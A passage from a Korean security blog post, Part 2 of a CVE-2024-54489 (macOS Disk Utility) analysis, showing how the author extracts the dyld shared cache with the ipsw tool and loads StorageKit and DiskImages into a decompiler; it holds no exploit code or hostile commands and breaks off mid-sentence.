      <content:encoded><![CDATA[<p><img src="image1.jpg" alt="image1"></p><ul><li>CVE-2024-54489 Analysis Series<ul><li><a href="https://hackyboiz.github.io/2025/09/13/ji9umi/%5BResearch%5DCVE-2024-54489/KR/">Part 1</a></li><li>Part 2 [&#xD604;&#xC7AC; &#xAE00;]</li></ul></li></ul><h2 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h2><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, ji9umi&#xC785;&#xB2C8;&#xB2E4;! Part 1&#xC5D0;&#xC11C;&#xB294; CVE-2024-54489&#xAC00; &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; &#xB2E4;&#xC591;&#xD55C; &#xC811;&#xADFC; &#xBC29;&#xBC95;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xC600;&#xB294;&#xB370;&#xC694;, &#xC9C4;&#xD589;&#xD588;&#xB358; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li>CVE-2024-54489&#xB294; Apple&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xD55C; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xAE30;&#xC900; <strong>Disk Utility</strong>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xB428;</li><li>&#xC774;&#xC5D0; macOS&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xC778; <strong>Disk Utility.app</strong>&#xC758; diffing &#xC9C4;&#xD589;<br>&#x2192; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC740; &#xD655;&#xC778;&#xB418;&#xC9C0; &#xC54A;&#xC74C;</li><li>&#xC804;&#xCCB4; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xAE30; &#xC704;&#xD574; <strong>IPSW</strong> &#xD30C;&#xC77C;&#xC758; diffing &#xC9C4;&#xD589;<br>&#x2192; Disk Utility&#xC5D0; &#xAD00;&#xD55C; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xBCC0;&#xACBD; &#xB0B4;&#xC5ED;&#xC740; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC5F0;&#xAD00;&#xB41C; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xBC0F; &#xB2E4;&#xB978; &#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xC874;&#xC7AC;&#xD568;&#xC744; &#xD655;&#xC778;</li><li>&#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD55C; <em>root cause</em> &#xBD84;&#xC11D; &#xC9C4;&#xD589; &#xC911;</li></ol><p>Part 1&#xC5D0;&#xC11C;&#xB294; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xC911; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD750;&#xB984;&#xC744; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xC600;&#xC73C;&#xBA70; mount &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xD750;&#xB984; &#xBAA8;&#xB450; <strong>Dyld Shared Cache</strong> &#xB0B4;&#xC5D0; &#xAD6C;&#xD604;&#xB41C; &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>StorageKit.framework</strong>&#xC758; <code>[obj_1 mountWithCompletionBlock:]</code></li><li><strong>DiskImages.framework</strong>&#xC758; <code>_DIHLDiskImageAttach()</code></li></ul><h2 id="1-Analyze-DSC"><a href="#1-Analyze-DSC" class="headerlink" title="1. Analyze DSC"></a>1. Analyze DSC</h2><h3 id="1-1-extract-shared-cache"><a href="#1-1-extract-shared-cache" class="headerlink" title="1.1. extract shared cache"></a>1.1. extract shared cache</h3><p>&#xCD94;&#xAC00; &#xBD84;&#xC11D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xB450; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; &#xB0B4;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C; &#xB0B4;&#xC5D0;&#xC11C; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC704;&#xCE58;&#xB294; &#xCD1D; &#xC138; &#xACF3;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;:</p><ul><li><code>/System/Library/Frameworks/</code></li><li><code>/System/Library/PrivateFrameworks/</code></li><li><code>/Library/Frameworks/</code></li></ul><p>&#xD655;&#xC778;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD56D;&#xBAA9;&#xC740; StorageKit&#xACFC; DiskImages &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C; &#xC774;&#xB4E4;&#xC740;  <code>/System/Library/PrivateFrameworks/</code> &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ file /System/Library/PrivateFrameworks/StorageKit.framework /System/Library/PrivateFrameworks/StorageKit.framework: directory&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ file /System/Library/PrivateFrameworks/DiskImages.framework /System/Library/PrivateFrameworks/DiskImages.framework: directory</code></pre><p>&#xC6B0;&#xC120; StorageKit.framework &#xD3F4;&#xB354;&#xC758; &#xB0B4;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC2E4;&#xC81C; &#xBD84;&#xC11D;&#xC744; &#xC704;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD30C;&#xC77C;&#xC774; &#xC2DD;&#xBCC4;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xC810;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> /System/Library/PrivateFrameworks/StorageKit.framework &#x2570;$ tree ..&#x251C;&#x2500;&#x2500; Resources -&gt; Versions/Current/Resources&#x251C;&#x2500;&#x2500; StorageKit -&gt; Versions/Current/StorageKit&#x2514;&#x2500;&#x2500; Versions    &#x251C;&#x2500;&#x2500; A    &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; _CodeSignature    &#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; CodeResources    &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; Resources    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ar.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; BootCampAssistant.icns    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ca.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; cs.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; da.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; de.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; el.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; en_AU.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; en_GB.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; en.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; es_419.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; es_US.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; es.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; fi.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; fr_CA.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; fr.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; he.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; hi.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; hr.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; hu.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; id.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; Info.plist    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; InfoPlist.loctable    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; it.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ja.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ko.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; Localizable.loctable    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ms.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; nl.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; no.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; pl.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; pt_BR.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; pt_PT.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ro.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; ru.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; sk.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; SKError.loctable    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; sl.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; sv.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; th.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; tr.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; uk.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; UserPictureNotFound.jpg    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; version.plist    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; vi.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; zh_CN.lproj    &#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; zh_HK.lproj    &#x2502;&#xA0;&#xA0;     &#x2514;&#x2500;&#x2500; zh_TW.lproj    &#x2514;&#x2500;&#x2500; Current -&gt; A48 directories, 9 files</code></pre><p>&#xC774;&#xB294; macOS Big Sur&#xBD80;&#xD130; &#xC2DC;&#xC2A4;&#xD15C; &#xBD80;&#xD305; &#xC2DC; &#xD37C;&#xD3EC;&#xBA3C;&#xC2A4; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC704;&#xD574; &#xBAA8;&#xB4E0; &#xB0B4;&#xC7A5; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xD558;&#xB098;&#xB85C; &#xD1B5;&#xD569;&#xD55C; &#xCE90;&#xC2DC; &#xD30C;&#xC77C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; &#xBC30;&#xD3EC;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD30C;&#xC77C;&#xC758; &#xBA85;&#xCE6D;&#xC740; <strong>dyld shared cache</strong>&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC740; <code>/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/</code> &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;  x86_64&#xC640; arm64e&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBCC4;&#xAC1C;&#xC758; &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ ls -l /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/total 10850248-rwxr-xr-x  1 root  admin   844242203 Aug 17 03:44 aot_shared_cache.0-rwxr-xr-x  1 root  admin   910422299 Aug 17 03:44 aot_shared_cache.1-rwxr-xr-x  1 root  admin   897691547 Aug 17 03:44 aot_shared_cache.2-rwxr-xr-x  1 root  admin   787358363 Aug 17 03:44 aot_shared_cache.3-rwxr-xr-x  1 root  admin   896155931 Aug 17 03:44 aot_shared_cache.4-rwxr-xr-x  1 root  admin   713302043 Aug 17 03:44 aot_shared_cache.5-rwxr-xr-x  1 root  admin  2712764416 Aug 17 03:44 dyld_shared_cache_arm64e-rwxr-xr-x  1 root  admin  2203500544 Aug 17 03:44 dyld_shared_cache_arm64e.01-rwxr-xr-x  1 root  admin     2023837 Aug 17 03:44 dyld_shared_cache_arm64e.atlas-rwxr-xr-x  1 root  admin     1140220 Aug 17 03:44 dyld_shared_cache_arm64e.map-rwxr-xr-x  1 root  admin   877608960 Aug 17 03:44 dyld_shared_cache_x86_64-rwxr-xr-x  1 root  admin   804831232 Aug 17 03:44 dyld_shared_cache_x86_64.01-rwxr-xr-x  1 root  admin   789921792 Aug 17 03:44 dyld_shared_cache_x86_64.02-rwxr-xr-x  1 root  admin   777699328 Aug 17 03:44 dyld_shared_cache_x86_64.03-rwxr-xr-x  1 root  admin   782598144 Aug 17 03:44 dyld_shared_cache_x86_64.04-rwxr-xr-x  1 root  admin   850001920 Aug 17 03:44 dyld_shared_cache_x86_64.05-rwxr-xr-x  1 root  admin     1155495 Aug 17 03:44 dyld_shared_cache_x86_64.atlas-rwxr-xr-x  1 root  admin      959702 Aug 17 03:44 dyld_shared_cache_x86_64.map</code></pre><p>&#xB9CC;&#xC57D; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xD604;&#xC7AC; &#xC124;&#xCE58;&#xB41C; OS&#xC778; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xC704;&#xCE58;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xB3C4;&#xAD6C; &#xB4F1;&#xC5D0; &#xBD88;&#xB7EC;&#xC640;&#xC11C; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB098; &#xB2E4;&#xB978; &#xBC84;&#xC804;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xACBD;&#xC6B0; &#xD38C;&#xC6E8;&#xC5B4; &#xD30C;&#xC77C;&#xB85C;&#xBD80;&#xD130; &#xCD94;&#xCD9C;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC704;&#xD574; diffing&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD588;&#xB358; <code>ipsw</code> &#xB3C4;&#xAD6C;&#xB97C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>ipsw</code> &#xBA85;&#xB839;&#xC740; <code>diff</code> &#xC635;&#xC158; &#xC678;&#xC5D0;&#xB3C4; &#xD30C;&#xC77C; &#xCD94;&#xCD9C;&#xC744; &#xC704;&#xD55C; <code>extract</code>&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294;&#xB370; &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xB300;&#xC0C1;&#xC5D0; &#xB530;&#xB978; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC635;&#xC158;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ ipsw extract -hExtract kernelcache, dyld_shared_cache or DeviceTree from IPSW/OTAUsage:  ipsw extract &lt;IPSW/OTA | URL&gt; [flags]Aliases:  extract, e, exExamples:<span class="hljs-comment"># Extract kernelcache from IPSW</span>$ ipsw extract --kernel iPhone15,2_16.5_20F66_Restore.ipsw<span class="hljs-comment"># Extract dyld_shared_cache for specific architecture</span>$ ipsw extract --dyld --dyld-arch arm64e iPhone.ipsw<span class="hljs-comment"># Extract all files matching a pattern (from the IPSW zip contents)</span>$ ipsw extract --pattern <span class="hljs-string">&apos;.*\.ttf$&apos;</span> iOS.ipsw<span class="hljs-comment"># Extract multiple components with custom output directory</span>$ ipsw extract --kernel --sep --dyld -o /tmp/extracted iPhone.ipsw<span class="hljs-comment"># Extract from remote URL</span>$ ipsw extract --kernel --remote https://updates.cdn-apple.com/iPhone.ipsw<span class="hljs-comment"># Extract system version info as JSON</span>$ ipsw extract --sys-ver iPhone.ipsw<span class="hljs-comment"># Extract files from filesystem DMG matching pattern</span>$ ipsw extract --files --pattern <span class="hljs-string">&apos;.*LaunchDaemons.*\.plist$&apos;</span> iPhone.ipsw<span class="hljs-comment"># Extract DriverKit dyld_shared_cache</span>$ ipsw extract --dyld --driverkit macOS.ipsw</code></pre><p>&#xCD94;&#xCD9C;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB300;&#xC0C1;&#xC740; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>--files</code>&#xC640; <code>--pattern</code>&#xC744; &#xC870;&#xD569;&#xD558;&#xC5EC;&#xB3C4; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xB354; &#xD3B8;&#xB9AC;&#xD55C; <code>--dyld</code> &#xC640; <code>--dyld-arch</code>&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xBA74; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC815;&#xC758;&#xD574;&#xC8FC;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBE60;&#xB974;&#xAC8C; &#xCD94;&#xCD9C;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD55C; &#xD30C;&#xC77C; &#xC678;&#xC5D0;&#xB3C4; 2&#xAC1C;&#xC758; &#xD30C;&#xC77C;&#xC774; &#xCD94;&#xAC00;&#xB85C; &#xCD94;&#xCD9C;&#xB41C; &#xC810;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~/Mine/<span class="hljs-number">001</span>_Security/n-day/CVE<span class="hljs-number">-2024</span><span class="hljs-number">-54489</span>/rsc/<span class="hljs-number">24</span>B91__MacOS &#x2570;$ ls -l dyld_shared_cache_arm64e*-rwxr-xr-x@ <span class="hljs-number">1</span> ji9umi  staff  <span class="hljs-number">2506964992</span> Sep  <span class="hljs-number">6</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span> dyld_shared_cache_arm64e-rwxr-xr-x@ <span class="hljs-number">1</span> ji9umi  staff  <span class="hljs-number">2121580544</span> Sep  <span class="hljs-number">6</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span> dyld_shared_cache_arm64e<span class="hljs-number">.01</span>-rwxr-xr-x@ <span class="hljs-number">1</span> ji9umi  staff     <span class="hljs-number">1106577</span> Sep  <span class="hljs-number">6</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span> dyld_shared_cache_arm64e.map</code></pre><p>&#xAC01; &#xD30C;&#xC77C;&#xC758; &#xC6A9;&#xB3C4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>dyld_shared_cache_arm64e</strong><ol><li>&#xBA54;&#xC778; &#xD30C;&#xC77C;&#xB85C; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xB530;&#xB77C; arm64e &#xB300;&#xC2E0; x86_64&#xC758; &#xC774;&#xB984;&#xC744; &#xAC00;&#xC9C4; &#xD30C;&#xC77C;&#xB3C4; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC74C;</li></ol></li><li><strong>dyld_shared_cache_arm64e.01</strong><ol><li>&#xBA54;&#xC778; &#xD30C;&#xC77C;&#xC758; &#xBD84;&#xD560;&#xB41C; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xAE30;&#xB2A5;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xBA54;&#xC778; &#xD30C;&#xC77C;&#xC758; &#xD655;&#xC7A5; &#xC5ED;&#xD560;&#xB85C; &#xC0AC;&#xC6A9;&#xB428;</li><li>&#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xAE30;&#xC900; arm64e&#xC758; &#xBD84;&#xD560; &#xD30C;&#xC77C;&#xC740; &#xD558;&#xB098;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xC5EC; <code>.01</code>&#xC774;&#xC9C0;&#xB9CC; x86_64&#xB294; <code>.05</code>&#xAE4C;&#xC9C0; &#xB118;&#xBC84;&#xB9C1;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC74C;</li></ol></li><li><strong>dyld_shared_cache_arm64e.map</strong><ol><li>&#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC791;&#xC131;&#xB41C; text map&#xC73C;&#xB85C; &#xBA54;&#xC778; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xB9E4;&#xD551; &#xC8FC;&#xC18C; &#xB4F1;&#xC774; &#xAE30;&#xB85D;&#xB418;&#xC5B4; &#xC788;&#xC74C;</li></ol></li></ol><h3 id="1-2-decompile-shared-cache"><a href="#1-2-decompile-shared-cache" class="headerlink" title="1.2. decompile shared cache"></a>1.2. decompile shared cache</h3><p>&#xCD94;&#xCD9C;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xD30C;&#xC77C;&#xC740; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0; &#xC62C;&#xB824; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18; &#xD30C;&#xC77C;&#xACFC; &#xB2E4;&#xB978; &#xC810;&#xC774;&#xB77C;&#xBA74; &#xC5B4;&#xB5A4; &#xC601;&#xC5ED;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xAC83;&#xC778;&#xC9C0; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC774; &#xC694;&#xAD6C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image2.png" alt="image.png"></p><p>&#xC704; &#xD654;&#xBA74;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB2CC;&#xC790;&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; <strong>Dyld Shared Cache Triage</strong> view&#xB85C; &#xB0B4;&#xBD80;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB85C; &#xC8FC;&#xC18C;&#xC640; &#xC774;&#xB984; &#xC678;&#xC5D0; <em>Loaded</em> &#xD56D;&#xBAA9;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xC774;&#xB294; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC5D0; &#xD55C;&#xC815;&#xD558;&#xC5EC; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC801;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image3.png" alt="image.png"></p><p>&#xAC80;&#xC0C9;&#xC744; &#xD1B5;&#xD574; &#xD0A4;&#xC6CC;&#xB4DC;&#xB85C; &#xD544;&#xD130;&#xB9C1; &#xD558;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xC6D0;&#xD558;&#xB294; &#xD56D;&#xBAA9;&#xC744; &#xC6B0;&#xD074;&#xB9AD;&#xD560; &#xACBD;&#xC6B0; &#xC120;&#xD0DD;&#xD55C; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xBD88;&#xB7EC;&#xC624;&#xB294; &#xAC83;&#xACFC; &#xC774;&#xC640; &#xC5F0;&#xAD00;&#xB41C; &#xD30C;&#xC77C;&#xAE4C;&#xC9C0; &#xBD88;&#xB7EC;&#xC624;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC635;&#xC158;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5F0;&#xAD00;&#xB41C; &#xD56D;&#xBAA9;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xC120;&#xD0DD;&#xD560; &#xACBD;&#xC6B0; &#xB300;&#xC0C1;&#xACFC; &#xAD00;&#xB828;&#xB41C; dylib &#xBC0F; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xAC00; &#xAC19;&#xC774; &#xC801;&#xC7AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC801;&#xC7AC; &#xC774;&#xD6C4; &#xBD84;&#xC11D;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBD84;&#xC11D; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xBAA8;&#xB4E0; &#xC601;&#xC5ED;&#xC744; &#xC801;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xC77C;&#xBD80; &#xCC38;&#xC870;&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xCC3E;&#xC9C0; &#xBABB;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5F0;&#xAD00;&#xB41C; &#xB9E5;&#xB77D;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB294; &#xB2A5;&#xB825;&#xC774; &#xC694;&#xAD6C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC2E4;&#xC81C; &#xBD84;&#xC11D; &#xD654;&#xBA74;&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9; 